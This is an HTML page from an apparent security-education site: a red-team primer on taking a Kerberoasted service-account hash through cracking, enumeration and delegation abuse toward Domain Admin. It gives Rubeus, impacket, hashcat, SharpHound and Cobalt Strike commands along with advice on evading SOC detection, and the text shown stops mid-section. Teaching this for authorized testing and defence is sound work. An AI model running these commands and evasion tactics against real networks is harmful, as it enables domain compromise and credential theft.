@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="You Kerberoasted a hash. The full playbook from a single TGS-REP to Domain Admin — cracking, LDAP triage, the five typical wins, and the lateral chain.">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; script-src 'self' 'unsafe-inline'; frame-ancestors 'none';">
+<title>You Kerberoasted a hash. Your move. | sudobyter / smarter</title>
+<link rel="icon" type="image/svg+xml" href="../img/svg/favicon.svg">
+<style>
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: url('../fonts/jetbrains-mono-latin.woff2') format('woff2');
+  font-weight: 400;
+  font-display: swap;
+}
+
+:root {
+  --bg:        #0a0e0b;
+  --bg-2:     #0f1411;
+  --panel:    #11161300;
+  --border:   #1f2a22;
+  --border-2: #2a3a30;
+  --fg:       #d6e3d8;
+  --muted:    #7a8a7f;
+  --green:    #5bd66d;
+  --green-d:  #2c8a3a;
+  --amber:    #e9c46a;
+  --red:      #ff6b6b;
+  --blue:     #6cb6ff;
+  --magenta:  #c084fc;
+}
+
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; scroll-padding-top: 80px; }
+body {
+  margin: 0; padding: 0;
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'JetBrains Mono', 'SF Mono', Menlo, Monaco, Consolas, monospace;
+  font-size: 15px;
+  line-height: 1.7;
+  -webkit-font-smoothing: antialiased;
+}
+
+a { color: var(--blue); text-decoration: none; }
+a:hover { color: var(--green); text-decoration: underline; text-underline-offset: 3px; }
+
+.progress-bar {
+  position: fixed; top: 0; left: 0; right: 0;
+  height: 2px;
+  background: transparent;
+  z-index: 100;
+}
+.progress-bar::after {
+  content: ''; display: block;
+  height: 100%;
+  width: var(--progress, 0%);
+  background: var(--green);
+  box-shadow: 0 0 10px var(--green);
+  transition: width 80ms linear;
+}
+
+.site-nav {
+  position: sticky; top: 0;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 28px;
+  background: rgba(10, 14, 11, 0.85);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid var(--border);
+  z-index: 50;
+  font-size: 14px;
+}
+.site-nav .logo { color: var(--fg); font-weight: 500; }
+.site-nav .logo span { color: var(--green); }
+.site-nav .back { color: var(--muted); }
+.site-nav .back:hover { color: var(--green); text-decoration: none; }
+
+.primer-hero {
+  padding: 64px 28px 36px;
+  border-bottom: 1px dashed var(--border);
+  max-width: 1180px; margin: 0 auto;
+}
+.primer-hero .crumbs { color: var(--muted); font-size: 12px; letter-spacing: 0.04em; margin-bottom: 14px; }
+.primer-hero .crumbs .root { color: var(--green-d); }
+.primer-hero h1 { font-size: 36px; margin: 0 0 14px; font-weight: 500; line-height: 1.25; letter-spacing: -0.01em; }
+.primer-hero h1 .sigil { color: var(--green); }
+.primer-hero .lede { font-size: 17px; color: var(--fg); opacity: 0.85; max-width: 780px; margin: 0 0 22px; line-height: 1.6; }
+.primer-hero .meta { display: flex; flex-wrap: wrap; gap: 22px; color: var(--muted); font-size: 12.5px; }
+.primer-hero .meta span b { color: var(--amber); font-weight: 500; }
+
+.primer-main {
+  display: grid;
+  grid-template-columns: 240px minmax(0, 760px);
+  gap: 56px;
+  max-width: 1180px;
+  margin: 0 auto;
+  padding: 40px 28px 80px;
+}
+
+.toc { position: sticky; top: 78px; align-self: start; max-height: calc(100vh - 100px); overflow-y: auto; font-size: 13px; }
+.toc-title { color: var(--muted); text-transform: uppercase; letter-spacing: 0.12em; font-size: 11px; margin: 0 0 14px; padding-bottom: 8px; border-bottom: 1px dashed var(--border); }
+.toc ol { list-style: none; padding: 0; margin: 0; counter-reset: toc; }
+.toc li { counter-increment: toc; margin: 6px 0; }
+.toc li a { color: var(--muted); display: block; padding: 4px 0 4px 22px; position: relative; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s, padding-left 0.15s; line-height: 1.45; }
+.toc li a::before { content: counter(toc, decimal-leading-zero); position: absolute; left: 0; color: var(--green-d); font-size: 11px; }
+.toc li a:hover { color: var(--fg); text-decoration: none; }
+.toc li a.active { color: var(--green); border-left: 2px solid var(--green); padding-left: 24px; }
+
+.primer-article { min-width: 0; }
+.primer-article h2 { font-size: 22px; margin: 56px 0 18px; color: var(--fg); font-weight: 500; line-height: 1.3; scroll-margin-top: 80px; }
+.primer-article h2::before { content: '## '; color: var(--green-d); }
+.primer-article h2:first-child { margin-top: 0; }
+.primer-article h3 { font-size: 16px; margin: 32px 0 10px; color: var(--amber); font-weight: 500; scroll-margin-top: 80px; }
+.primer-article h3::before { content: '# '; color: var(--green-d); }
+.primer-article h4 { font-size: 14px; margin: 22px 0 6px; color: var(--blue); font-weight: 500; }
+.primer-article p { margin: 14px 0; }
+.primer-article p code, .primer-article li code, .primer-article td code {
+  background: var(--bg-2); border: 1px solid var(--border);
+  padding: 1px 6px; border-radius: 3px; color: var(--amber); font-size: 13px;
+}
+.primer-article ul, .primer-article ol { padding-left: 22px; margin: 12px 0; }
+.primer-article li { margin: 6px 0; }
+.primer-article strong { color: var(--fg); font-weight: 600; }
+.primer-article em { color: var(--amber); font-style: italic; }
+
+.anchor { margin-left: 8px; opacity: 0; color: var(--green-d); font-size: 0.85em; transition: opacity 0.15s; }
+h2:hover .anchor, h3:hover .anchor { opacity: 1; }
+.anchor:hover { color: var(--green); }
+
+.analogy { border-left: 3px solid var(--amber); background: linear-gradient(90deg, rgba(233,196,106,0.06), transparent 80%); padding: 16px 18px; margin: 24px 0; border-radius: 0 4px 4px 0; }
+.analogy .tag { display: inline-block; font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: var(--amber); margin-bottom: 6px; }
+
+.warning { border-left: 3px solid var(--red); background: linear-gradient(90deg, rgba(255,107,107,0.05), transparent 80%); padding: 14px 18px; margin: 20px 0; border-radius: 0 4px 4px 0; font-size: 14px; }
+.warning .tag { display: inline-block; font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: var(--red); margin-bottom: 6px; }
+
+.diagram { margin: 28px 0; padding: 20px; background: var(--bg-2); border: 1px solid var(--border); border-radius: 6px; text-align: center; overflow-x: auto; }
+.diagram svg { max-width: 100%; height: auto; }
+.diagram figcaption { margin-top: 12px; color: var(--muted); font-size: 12px; font-style: italic; }
+
+.win-card { border: 1px solid var(--border); border-left: 3px solid var(--green); background: var(--bg-2); border-radius: 4px; padding: 14px 18px; margin: 14px 0; }
+.win-card h4 { margin: 0 0 6px; color: var(--green); font-size: 14px; }
+.win-card .freq { color: var(--muted); font-size: 11px; letter-spacing: 0.04em; margin-bottom: 8px; text-transform: uppercase; }
+.win-card p { margin: 6px 0; font-size: 14px; }
+
+.cmd {
+  background: #050807;
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--green-d);
+  border-radius: 4px;
+  padding: 12px 16px;
+  margin: 14px 0;
+  font-size: 13px;
+  line-height: 1.55;
+  color: var(--fg);
+  overflow-x: auto;
+  white-space: pre;
+}
+.cmd .p { color: var(--green); }
+.cmd .k { color: var(--magenta); }
+.cmd .s { color: var(--amber); }
+.cmd .c { color: var(--muted); }
+.cmd .v { color: var(--blue); }
+.cmd .g { color: var(--green); }
+.cmd .r { color: var(--red); }
+
+.tbl { width: 100%; border-collapse: collapse; margin: 18px 0; font-size: 13px; }
+.tbl th, .tbl td { text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+.tbl th { background: var(--bg-2); color: var(--green-d); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; font-weight: 500; border-bottom: 1px solid var(--border-2); }
+.tbl tr:nth-child(even) td { background: rgba(255,255,255,0.012); }
+.tbl td.tool { color: var(--amber); font-weight: 500; }
+
+.primer-foot { border-top: 1px dashed var(--border); padding: 28px; max-width: 1180px; margin: 0 auto; color: var(--muted); font-size: 12.5px; display: flex; flex-wrap: wrap; justify-content: space-between; gap: 14px; }
+.primer-foot a { color: var(--green-d); }
+.primer-foot a:hover { color: var(--green); }
+
+@media (max-width: 880px) {
+  .primer-main { grid-template-columns: 1fr; gap: 32px; }
+  .toc { position: relative; top: 0; max-height: none; order: 2; border-top: 1px dashed var(--border); padding-top: 24px; }
+  .primer-article { order: 1; }
+  .primer-hero h1 { font-size: 28px; }
+  .primer-hero .lede { font-size: 15px; }
+}
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progress"></div>
+
+<nav class="site-nav">
+  <a href="../" class="logo">[<span>sudobyter</span>] / smarter</a>
+  <a href="../#smarter" class="back">← all primers</a>
+</nav>
+
+<header class="primer-hero">
+  <div class="crumbs"><span class="root">~</span> / smarter / continuation / <span style="color:var(--fg)">kerberoasted-hash</span></div>
+  <h1><span class="sigil">$</span> You Kerberoasted a hash. Your move.</h1>
+  <p class="lede">
+    A continuation primer. You ran <code>GetUserSPNs.py</code> or <code>Rubeus kerberoast</code>. You have a TGS-REP blob — one or more service accounts' tickets, encrypted with their NT hashes. This page walks the chain forward, all the way to Domain Admin.
+  </p>
+  <div class="meta">
+    <span>read time <b>~18 min</b></span>
+    <span>level <b>intermediate</b></span>
+    <span>assumes <b>the AD primer</b></span>
+    <span>updated <b>2026-05-18</b></span>
+  </div>
+
+  <div class="analogy" style="margin-top: 24px; padding: 12px 16px; font-size: 13.5px;">
+    <span class="tag">scope</span>
+    <p style="margin: 0;">
+      Written for red-team operators with explicit authorization, blue-team analysts building detections, and security students. Without scope, every step on this page is a felony in essentially every jurisdiction. Run them only against networks you own or have a written engagement letter for.
+    </p>
+  </div>
+
+  <div class="analogy" style="margin-top: 14px; padding: 12px 16px; font-size: 13.5px; border-left-color: var(--green); background: linear-gradient(90deg, rgba(91,214,109,0.06), transparent 80%);">
+    <span class="tag" style="color: var(--green);">tl;dr — the whole chain in 5 lines</span>
+    <ol style="margin: 4px 0 0; padding-left: 22px;">
+      <li><strong>Crack</strong> the TGS-REP hash offline. <code>hashcat -m 13100</code> for RC4 · <code>19600</code> / <code>19700</code> for AES.</li>
+      <li><strong>Enumerate</strong> the cracked account in BloodHound — groups, ACLs, and the delegation surface (don't skip delegation).</li>
+      <li><strong>Pick the win.</strong> Usually win #1 (SPN host → SYSTEM via Potato) or win #6 (delegation → impersonate DA without cracking).</li>
+      <li><strong>Log in</strong> via WinRM (quietest), <strong>harvest credentials</strong> from LSASS / SAM / DPAPI on the new host.</li>
+      <li><strong>Chain to Domain Admin</strong> via a cached DA TGT, a BloodHound ACL walk, or DCSync if you have replication rights.</li>
+    </ol>
+  </div>
+</header>
+
+<main class="primer-main">
+
+  <aside class="toc" id="toc">
+    <p class="toc-title">on this page</p>
+    <ol>
+      <li><a href="#hash">what you actually have</a></li>
+      <li><a href="#more">first: roast everything</a></li>
+      <li><a href="#crack">crack it</a></li>
+      <li><a href="#enumerate">enumerate the account</a></li>
+      <li><a href="#wins">the five typical wins</a></li>
+      <li><a href="#lateral">the lateral move</a></li>
+      <li><a href="#chain">chain to Domain Admin</a></li>
+      <li><a href="#nocrack">if the hash won't crack</a></li>
+      <li><a href="#detect">the defender's view</a></li>
+      <li><a href="#flow">the whole flow</a></li>
+      <li><a href="#deeper">going deeper</a></li>
+    </ol>
+  </aside>
+
+  <article class="primer-article">
+
+    <!-- §1 -->
+    <section>
+      <h2 id="hash">what you actually have<a class="anchor" href="#hash">#</a></h2>
+
+      <p>
+        You ran your roast. <code>hashes.txt</code> looks like this:
+      </p>
+
+      <div class="cmd"><span class="r">$krb5tgs$23$</span>*<span class="v">sqlsvc</span>$<span class="g">CORP.LOCAL</span>$<span class="s">MSSQLSvc/sqlsrv01.corp.local:1433</span>*$<span class="c">a3b1c... [long encrypted blob] ...f9e2d</span></div>
+
+      <p>That single line carries everything you need. Pulled apart:</p>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 900 280" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Anatomy of a TGS-REP hashcat hash">
+          <defs>
+            <marker id="ann" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#5bd66d"/>
+            </marker>
+          </defs>
+          <style>
+            .mono { font: 14px 'JetBrains Mono', monospace; }
+            .lbl-m { font: 11px 'JetBrains Mono', monospace; fill: #7a8a7f; }
+            .lbl-h { font: 12px 'JetBrains Mono', monospace; fill: #5bd66d; font-weight: 600; letter-spacing: 0.04em; }
+            .lbl-a { font: 12px 'JetBrains Mono', monospace; fill: #e9c46a; }
+            .lbl-r { font: 12px 'JetBrains Mono', monospace; fill: #ff6b6b; }
+            .lbl-b { font: 12px 'JetBrains Mono', monospace; fill: #6cb6ff; }
+            .lbl-mag { font: 12px 'JetBrains Mono', monospace; fill: #c084fc; }
+            .ann { stroke: #2c8a3a; stroke-width: 1; fill: none; }
+          </style>
+
+          <!-- the hash line -->
+          <text x="40" y="60" class="mono" fill="#ff6b6b">$krb5tgs$23$</text>
+          <text x="160" y="60" class="mono" fill="#d6e3d8">*</text>
+          <text x="172" y="60" class="mono" fill="#6cb6ff">sqlsvc</text>
+          <text x="232" y="60" class="mono" fill="#d6e3d8">$</text>
+          <text x="244" y="60" class="mono" fill="#5bd66d">CORP.LOCAL</text>
+          <text x="344" y="60" class="mono" fill="#d6e3d8">$</text>
+          <text x="356" y="60" class="mono" fill="#e9c46a">MSSQLSvc/sqlsrv01...:1433</text>
+          <text x="606" y="60" class="mono" fill="#d6e3d8">*$</text>
+          <text x="630" y="60" class="mono" fill="#c084fc">a3b1c...f9e2d</text>
+
+          <!-- annotations -->
+          <line x1="100" y1="70" x2="100" y2="120" class="ann"/>
+          <text x="100" y="140" text-anchor="middle" class="lbl-r">format tag</text>
+          <text x="100" y="158" text-anchor="middle" class="lbl-m">krb5tgs · type 23 =</text>
+          <text x="100" y="174" text-anchor="middle" class="lbl-m">RC4_HMAC (the easy one)</text>
+
+          <line x1="200" y1="70" x2="200" y2="200" class="ann"/>
+          <text x="200" y="218" text-anchor="middle" class="lbl-b">user</text>
+          <text x="200" y="234" text-anchor="middle" class="lbl-m">whose NT hash</text>
+          <text x="200" y="248" text-anchor="middle" class="lbl-m">encrypted this ticket</text>
+
+          <line x1="294" y1="70" x2="294" y2="120" class="ann"/>
+          <text x="294" y="140" text-anchor="middle" class="lbl-h">domain</text>
+
+          <line x1="470" y1="70" x2="470" y2="200" class="ann"/>
+          <text x="470" y="218" text-anchor="middle" class="lbl-a">SPN — the service</text>
+          <text x="470" y="234" text-anchor="middle" class="lbl-m">also tells you the HOST the</text>
+          <text x="470" y="248" text-anchor="middle" class="lbl-m">account is the service of</text>
+
+          <line x1="680" y1="70" x2="680" y2="120" class="ann"/>
+          <text x="680" y="140" text-anchor="middle" class="lbl-mag">ciphertext</text>
+          <text x="680" y="158" text-anchor="middle" class="lbl-m">TGS encrypted with the</text>
+          <text x="680" y="174" text-anchor="middle" class="lbl-m">account's key (NT hash for RC4,</text>
+          <text x="680" y="190" text-anchor="middle" class="lbl-m">PBKDF2-derived for AES)</text>
+        </svg>
+        <figcaption>The anatomy of a TGS-REP hashcat hash. Crack the ciphertext → recover the service account's password. The SPN tells you which host this account is the service of, which is your first lateral target.</figcaption>
+      </figure>
+
+      <p>
+        The thing that makes this work: <strong>Kerberos service tickets are encrypted with a key derived from the target service account's password</strong>. The KDC issues a TGS to <em>any</em> authenticated user who asks for it (assuming the SPN exists and the user has a valid TGT). You never had to authenticate to the service itself. You weaponized a feature.
+      </p>
+
+      <p>
+        For RC4 (etype <code>23</code>, the legacy fast-to-crack type), the key literally <em>is</em> the NT hash — <code>MD4(UTF-16LE(password))</code>. For AES (etypes <code>17</code> = AES128 and <code>18</code> = AES256, much harder to crack), the key is a different derivation: <code>PBKDF2-HMAC-SHA1(password, salt=&lt;upn&gt;@&lt;REALM&gt;, iterations=4096)</code>. Different math, different speeds, hashcat modes <code>13100</code> / <code>19600</code> / <code>19700</code> respectively. Old accounts and accounts whose <code>msDS-SupportedEncryptionTypes</code> attribute is unset usually return RC4 — which is why operators ask for RC4 explicitly.
+      </p>
+    </section>
+
+    <!-- §2 -->
+    <section>
+      <h2 id="more">first: roast everything<a class="anchor" href="#more">#</a></h2>
+
+      <p>If you only have one hash, get the rest first. One run, every Kerberoastable account in the domain. Mentally, the LDAP filter is:</p>
+
+      <div class="cmd"><span class="c"># &quot;user objects (not computers), with at least one SPN, not disabled&quot;</span>
+<span class="g">(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))</span></div>
+
+      <p>Tooling runs that filter for you:</p>
+
+      <div class="cmd"><span class="c"># from Linux (impacket):</span>
+<span class="p">$</span> <span class="k">GetUserSPNs.py</span> -dc-ip <span class="v">10.0.0.10</span> <span class="s">'corp.local/lowuser:Password'</span> -request -outputfile <span class="v">hashes.txt</span>
+
+<span class="c"># from a Windows beacon:</span>
+<span class="p">PS&gt;</span> <span class="k">.\Rubeus.exe</span> kerberoast /outfile:<span class="v">hashes.txt</span> /nowrap
+
+<span class="c"># target a single account (quieter):</span>
+<span class="p">$</span> <span class="k">GetUserSPNs.py</span> -dc-ip <span class="v">10.0.0.10</span> <span class="s">'corp.local/lowuser:Password'</span> -request-user <span class="v">sqlsvc</span></div>
+
+      <p>Important Rubeus flags worth knowing:</p>
+      <ul>
+        <li><code>/tgtdeleg</code> — pulls a fresh TGT for your session via Kerberos delegation, lets you make requests without using your current token. Looks more legitimate to defenders.</li>
+        <li><code>/rc4opsec</code> — Rubeus skips accounts whose <code>msDS-SupportedEncryptionTypes</code> has the AES128 or AES256 bits set (i.e. <code>attr &amp; 0x18 != 0</code>). For the remaining accounts it requests RC4 tickets. Avoids the loud "RC4 requested when AES expected" signal that fires when you ask for RC4 on an account whose attribute says AES-only.</li>
+        <li><code>/user:&lt;username&gt;</code> — targeted, single account.</li>
+        <li><code>/stats</code> — list every Kerberoastable account first <em>without</em> requesting tickets. Helps you pick which to roast.</li>
+        <li><code>/delay:30000 /jitter:25</code> — pace ticket requests over time. The defender-side signature for kerberoasting is "many 4769 events from one source in a short window." Slow it down and that signature dies.</li>
+      </ul>
+
+      <div class="warning">
+        <span class="tag">tempo reality</span>
+        "Spread over hours" is a CTF tempo. Real engagements (and real adversaries) spread over <strong>days or weeks</strong>. Mature SOCs correlate 4769 events on 7–30 day windows; "5 tickets in 5 minutes" and "5 tickets per day for 5 days" look identical to a daily-event-count rule but very different to a streak detector. If you're operating against a real environment, treat each ticket as a separate operation. Patience is the difference between a successful engagement and a burned one.
+      </div>
+
+      <p>
+        <strong>Recon before you roast.</strong> List Kerberoastable accounts with <code>/stats</code> and pick the ones whose passwords are oldest. The output looks like this:
+      </p>
+
+      <figure class="diagram" style="margin: 20px 0;">
+        <img src="../img/smarter/kerberoasted/01_rubeus_stats.png" alt="Rubeus kerberoast /stats output showing 5 Kerberoastable accounts sorted by pwdLastSet" style="max-width: 100%; height: auto; border-radius: 4px; display: block; margin: 0 auto;">
+        <figcaption>Recon view. The 2009-stale <code>sqlsvc</code> is the prime target — old password, RC4-only key likely, and the SPN tells you the host. The 2026 <code>mssql-managed$</code> is a gMSA — skip it, you won't crack a 240-char random.</figcaption>
+      </figure>
+
+      <p>From a Windows beacon with PowerView, the same survey via LDAP:</p>
+      <div class="cmd"><span class="p">PS&gt;</span> <span class="k">Get-DomainUser</span> -SPN | <span class="k">Select-Object</span> samaccountname, pwdLastSet | <span class="k">Sort-Object</span> pwdLastSet</div>
+      <p>
+        Old passwords are weak passwords. A service account whose password hasn't changed since 2014 is the one to roast first. Some haven't been touched since 2009. That's not a joke.
+      </p>
+
+      <p>
+        From a Cobalt Strike beacon, the canonical in-memory invocation:
+      </p>
+      <div class="cmd"><span class="p">beacon&gt;</span> <span class="k">execute-assembly</span> /opt/Rubeus.exe kerberoast /nowrap /rc4opsec /delay:30000</div>
+      <p>
+        CS 4.5+ also ships a native <code>kerberoast</code> aggressor command that does the same thing without dropping the .NET assembly. The same <code>execute-assembly</code> primitive works from <strong>Sliver, Mythic, Havoc, PoshC2</strong> — the OSS C2 frameworks people use when they don't have CS budget. The protocol behavior is identical; only the loader changes.
+      </p>
+    </section>
+
+    <!-- §3 -->
+    <section>
+      <h2 id="crack">crack it<a class="anchor" href="#crack">#</a></h2>
+
+      <div class="analogy" style="border-left-color: var(--green); background: linear-gradient(90deg, rgba(91,214,109,0.06), transparent 80%);">
+        <span class="tag" style="color: var(--green);">the invisible step</span>
+        <p style="margin: 0; font-size: 14px;">
+          Cracking happens on <em>your</em> hardware, on <em>your</em> network. The DC never sees it. <strong>This is the only phase of the entire chain that defenders cannot detect</strong> — there are no logs to dampen, no telemetry to evade. Take as much time as you need.
+        </p>
+      </div>
+
+      <div class="cmd"><span class="c"># hashcat — RC4_HMAC TGS</span>
+<span class="p">$</span> <span class="k">hashcat</span> -m 13100 -a 0 hashes.txt <span class="v">rockyou.txt</span>
+
+<span class="c"># wordlist + best64 rules (probably your first attempt)</span>
+<span class="p">$</span> <span class="k">hashcat</span> -m 13100 -a 0 hashes.txt <span class="v">rockyou.txt</span> -r /usr/share/hashcat/rules/<span class="s">best64.rule</span>
+
+<span class="c"># custom service-account wordlist + heavy rules</span>
+<span class="p">$</span> <span class="k">hashcat</span> -m 13100 -a 0 hashes.txt <span class="v">service-accounts.txt</span> -r <span class="s">OneRuleToRuleThemAll.rule</span></div>
+
+      <p>The realistic stats from real engagements:</p>
+      <ul>
+        <li><strong>Service account passwords are stale.</strong> They were set once by a sysadmin and never rotated. 5-15 years is common.</li>
+        <li><strong>They follow human patterns.</strong> <code>Service2014!</code>. <code>Company123</code>. <code>servername</code>. <code>Spring2018</code>. <code>P@ssword1</code>.</li>
+        <li><strong>Rockyou + best64 hits ~30%</strong> of Kerberoastable accounts in a typical environment.</li>
+        <li><strong>Custom wordlist (service name + year combos + company-specific terms) + OneRule + 24 hours hits ~60%.</strong></li>
+        <li><strong>The other 40% are the strong passwords or the gMSAs.</strong> See §8.</li>
+      </ul>
+
+      <p>What you get back: <code>sqlsvc:Sql_Server_2014!</code>. Cleartext.</p>
+
+      <p style="color: var(--muted); font-style: italic; font-size: 13.5px;">
+        My personal worst was a <code>MSSQLSvc</code> account whose password was set in 2007. The cleartext was the company name plus that year. Cracked in 12 seconds with a 30-line custom wordlist. Service accounts are time capsules.
+      </p>
+
+      <div class="warning">
+        <span class="tag">the AES reality</span>
+        In modern environments (Server 2019+, accounts with <code>msDS-SupportedEncryptionTypes</code> set explicitly), the KDC will return <strong>AES-encrypted</strong> tickets — type <code>17</code> (AES128) or <code>18</code> (AES256), not type 23. The hashcat modes are <code>19600</code> (AES128) and <code>19700</code> (AES256). They're <em>much</em> slower than RC4 to crack — orders of magnitude — and if the password is genuinely random, you won't crack at all. If your roast comes back as type 17/18 and the password isn't in a wordlist within an hour, move on to AS-REP roasting or another path instead of throwing more GPU at it.
+      </div>
+
+      <p style="margin-top: 16px;">
+        <strong>Why RC4 still keeps working in supposedly AES-modernized estates:</strong> when a password is set or changed, the DC computes <em>all</em> supported encryption keys at that moment (NT/RC4, AES128, AES256) and stores them in the directory. AES keys are <em>not</em> computed lazily — they exist only if the password change happened on a DC at Server 2008 functional level or higher. Service accounts whose passwords were last set on a 2003-era DC have <em>no AES key stored at all</em>, regardless of current domain functional level. The KDC returns RC4 because nothing else is available. The fix is to force a password reset; without it, the time-capsule sticks.
+      </p>
+
+      <p>
+        <strong>Gotcha worth knowing:</strong> <code>msDS-SupportedEncryptionTypes</code> can disagree with what's actually stored. If the attribute claims AES-only (<code>0x18</code>) but the account's password is stale and no AES key was ever derived, the KDC returns <code>KDC_ERR_ETYPE_NOTSUPP</code> instead of falling back to RC4. The attribute reflects <em>policy</em>; the stored keys reflect <em>history</em>. The two can drift.
+      </p>
+    </section>
+
+    <!-- §4 -->
+    <section>
+      <h2 id="enumerate">enumerate the account before you log in<a class="anchor" href="#enumerate">#</a></h2>
+
+      <p>
+        <strong>Don't log in yet.</strong> The account's <em>permissions</em> are usually more interesting than the cleartext password itself. A service account that's local admin on five SQL boxes is nice. A service account that has <code>GenericAll</code> on the Domain Admins group is the whole game in one step. You won't know which you have until you enumerate.
+      </p>
+
+      <div class="warning">
+        <span class="tag">compartmentalization</span>
+        Do the <em>recon</em> with a low-value identity — the original foothold user, or a separate compromised account you don't mind burning. Save the just-cracked <code>sqlsvc</code> for the actual exploitation step. Reason: BloodHound and LDAP scraping are loud, and the auth event tying that loud noise to your high-value identity is exactly the link a SOC will pivot on if they detect anything. Burn the cheap account on recon. Spend the expensive one on the kill.
+      </div>
+
+      <p>The first three questions, with the commands:</p>
+
+      <h3>q1: what groups is this account in?</h3>
+      <div class="cmd"><span class="p">$</span> <span class="k">ldapsearch</span> -H ldap://dc01 -D <span class="s">"sqlsvc@corp.local"</span> -w <span class="s">"Sql_Server_2014!"</span> \
+           -b <span class="s">"DC=corp,DC=local"</span> <span class="s">"(sAMAccountName=sqlsvc)"</span> <span class="v">memberOf</span>
+
+<span class="c"># cleaner — use BloodHound + collect via SharpHound:</span>
+<span class="p">PS&gt;</span> <span class="k">.\SharpHound.exe</span> -c All --ldapusername sqlsvc --ldappassword <span class="s">'Sql_Server_2014!'</span> <span class="g">--Throttle 1000 --Jitter 50</span></div>
+      <p style="font-size: 13.5px; color: var(--muted);">
+        <code>--Throttle 1000 --Jitter 50</code> is critical. Default SharpHound makes thousands of LDAP queries in seconds — a BloodHound-is-running signature visible to any DC running LDAP query auditing. Throttled, it looks like a slow-curious human.
+      </p>
+
+      <p>
+        Look for membership in <code>Domain Admins</code>, <code>Enterprise Admins</code>, <code>Backup Operators</code>, <code>Account Operators</code>, <code>DnsAdmins</code>, custom "ServiceAccountAdmins"-style groups. Each one is a different chapter of the engagement.
+      </p>
+
+      <h3>q2: what ACLs does this account have on other objects?</h3>
+      <p>
+        This is where the gold usually is. A service account that nobody worried about may have been granted <code>GenericWrite</code> on a sensitive OU, <code>WriteDacl</code> on a privileged user, or <code>ForceChangePassword</code> on a DA. Native LDAP won't show you these; BloodHound's outbound-object-controls panel will.
+      </p>
+      <p>
+        In BloodHound, after import: select the <code>sqlsvc</code> node → "Outbound Object Control" → see every object this account can manipulate.
+      </p>
+
+      <p>
+        <strong>Delegation surface to check (this is win #6 territory — see §5):</strong>
+      </p>
+      <ul>
+        <li><strong>Does the cracked account itself have <code>userAccountControl</code> bit 19 / <code>0x80000</code> (<code>TRUSTED_FOR_DELEGATION</code>) set?</strong> → unconstrained delegation. The host the account runs on caches every TGT that authenticates to it, including DAs.</li>
+        <li><strong>Does the cracked account have <code>msDS-AllowedToDelegateTo</code> populated?</strong> → constrained delegation. You can S4U2self → S4U2proxy to impersonate <em>any</em> user to the SPNs in that attribute.</li>
+        <li><strong>Does the cracked account have <code>GenericAll</code> / <code>GenericWrite</code> on any computer or user object?</strong> → resource-based constrained delegation (RBCD). Write your own SID into that target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, then S4U2self/2proxy to land on the target as Administrator. (The attribute lives on the <em>target</em>, not on you — control over the target's ACL is what enables the attack.)</li>
+      </ul>
+
+      <h3>q3: what host is the SPN for?</h3>
+      <p>
+        Read the SPN back from the hash itself: <code>MSSQLSvc/sqlsrv01.corp.local:1433</code> means this account is the service principal for the MSSQL instance on <code>sqlsrv01</code>. <strong>It is almost certainly running as that service on that host</strong>, which means <em>logging into <code>sqlsrv01</code> as <code>sqlsvc</code> usually grants you the same context the service runs in</em>. From there you're often a step away from SYSTEM (the service has <code>SeImpersonate</code>, which is the entire Potato playbook).
+      </p>
+    </section>
+
+    <!-- §5 -->
+    <section>
+      <h2 id="wins">the five typical wins<a class="anchor" href="#wins">#</a></h2>
+
+      <p>
+        Once you've enumerated, you'll find yourself in one of these buckets. The first five are <em>where this account can go</em> (from BloodHound's outbound-object-control view). The sixth is a different shape: <em>what this account can do via Kerberos delegation primitives</em> — a parallel attack surface that pays out independently of the first five. Roughly ordered by how often I see them on real engagements.
+      </p>
+
+      <div class="win-card">
+        <h4>win #1 · the SPN host (most common)</h4>
+        <div class="freq">frequency: ~60% of cracked roasts</div>
+        <p>
+          The account is local admin on the host it's the service of (because that's how the service was installed). Log into that host as the service account. From there: SYSTEM via SeImpersonate / Potato (the account almost always has it), then full credential harvest from LSASS.
+        </p>
+        <p style="color:var(--muted);font-size:12.5px;">
+          → next move in §6 (lateral).
+        </p>
+      </div>
+
+      <div class="win-card">
+        <h4>win #2 · local admin on N additional hosts</h4>
+        <div class="freq">frequency: ~30% of cracked roasts</div>
+        <p>
+          Sysadmins love using one service account across multiple boxes. The SQL account often has rights on every SQL server in the estate. The SCCM account is local admin on every host SCCM manages — which is usually <em>everything</em>. BloodHound's "first-degree local admin rights" view shows you the list. Each host is a new vantage point for credential harvest.
+        </p>
+      </div>
+
+      <div class="win-card">
+        <h4>win #3 · the ACL gold mine</h4>
+        <div class="freq">frequency: ~15% (overlaps with #1/#2)</div>
+        <p>
+          The account has an inherited or explicit ACL on something privileged: <code>GenericWrite</code> on a user (you can set an SPN on them and roast them, or change their password), <code>WriteDacl</code> on a group, <code>ForceChangePassword</code> on a specific user, <code>AllExtendedRights</code> on an OU. BloodHound auto-finds the shortest path from your roasted account to <code>Domain Admins</code> via these.
+        </p>
+      </div>
+
+      <div class="win-card">
+        <h4>win #4 · the account IS in Domain Admins</h4>
+        <div class="freq">frequency: ~5%, but it does happen</div>
+        <p>
